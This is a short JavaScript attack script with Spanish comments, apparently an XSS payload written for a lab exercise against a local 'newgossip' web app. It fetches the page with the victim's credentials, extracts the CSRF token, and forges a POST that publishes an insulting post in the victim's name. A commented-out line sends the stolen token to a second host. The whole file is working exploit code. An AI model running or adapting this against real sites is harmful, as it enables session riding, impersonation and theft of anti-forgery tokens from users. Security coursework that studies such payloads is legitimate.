var dominio = "http://localhost:10007/newgossip";
var dominioServidor="http://192.168.1.26:80";

var request1 = new XMLHttpRequest();

request1.open("GET", dominio, false);
request1.withCredentials = true;  // para tokens dinamicos
request1.send();

// guardamos la respuesta en una variable
var response= request1.responseText;
console.log(response);

// creamos un objeto DOMParser que nos permitira parsear el html
var parser = new DOMParser();
var doc = parser.parseFromString(response, "text/html");

// obtenemos el token csrf de la pagina
var token= doc.getElementsByName("_csrf_token")[0].value;


var request2 = new XMLHttpRequest();
// para obtener el token del servidor
// request2.open("POST", dominioServidor + "/?data=" + token);
// request2.send();
//
// para hacer post
data = "title=mi%20jefe%20es%20un%20carbon&subtitle=hijacked&text=soy%20astronata%20y%20odio%20a%20mi%20jefe,%20no%20entiende%20una%20mierda%20y%20me%20explota&_csrf_token=" + token;
request2.open("POST", dominio, false);
request2.withCredentials = true;  // para tokens dinamicos
request2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
request2.send(data);
